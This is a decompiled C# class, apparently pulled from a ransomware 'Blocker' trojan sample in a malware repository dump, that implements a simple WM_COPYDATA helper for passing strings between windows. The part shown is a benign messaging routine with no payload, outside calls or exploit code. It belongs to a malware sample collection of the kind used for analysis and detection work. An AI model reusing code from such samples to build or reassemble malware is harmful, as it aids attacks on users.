// Decompiled with JetBrains decompiler
// Type: Kzzdehomtdt.MessagePasser
// Assembly: Ring0, Version=20.31.2.5854, Culture=neutral, PublicKeyToken=null
// MVID: E3BC9DD1-F9F5-4043-B7FA-B406B3F50D7A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.07-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b48bae302c5f2114c9f4f0b497af5ac239792c1629cf5418492d10df273bfaca.exe

using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Kzzdehomtdt
{
  public static class MessagePasser
  {
    public static bool ThrowOnBadMessage = true;
    public static int WindowsMessageId = 74;

    public static int SendData(IntPtr targetWindowHandle, int messageId, int id, string message)
    {
      IntPtr num = NativeMethods.SendMessage(targetWindowHandle, messageId, IntPtr.Zero, ref new CopyData()
      {
        dwData = new IntPtr(id),
        cbData = (message.Length + 1) * Marshal.SystemDefaultCharSize,
        lpData = message
      });
      int lastWin32Error = Marshal.GetLastWin32Error();
      string message1 = new Win32Exception(lastWin32Error).Message;
      if (lastWin32Error != 0)
        throw new InvalidOperationException("Last Error isn't success:" + lastWin32Error.ToString() + Environment.NewLine + message1);
      return num.ToInt32();
    }

    public static int SendString(IntPtr targetWindowHandle, int id, string message) => MessagePasser.SendData(targetWindowHandle, MessagePasser.WindowsMessageId, id, message);

    public static int SendString(IntPtr targetWindowHandle, string message) => MessagePasser.SendString(targetWindowHandle, 1, message);

    public static CopyData ReceiveData(Message m)
    {
      if (m.Msg != MessagePasser.WindowsMessageId)
      {
        if (MessagePasser.ThrowOnBadMessage)
          throw new InvalidOperationException("Message isn't WM_COPYDATA");
        return new CopyData();
      }
      m.Result = new IntPtr(1);
      CopyData lparam = (CopyData) m.GetLParam(typeof (CopyData));
      m.Result = new IntPtr(0);
      return lparam;
    }

    public static string ReceiveString(Message m) => MessagePasser.ReceiveData(m).lpData;
  }
}
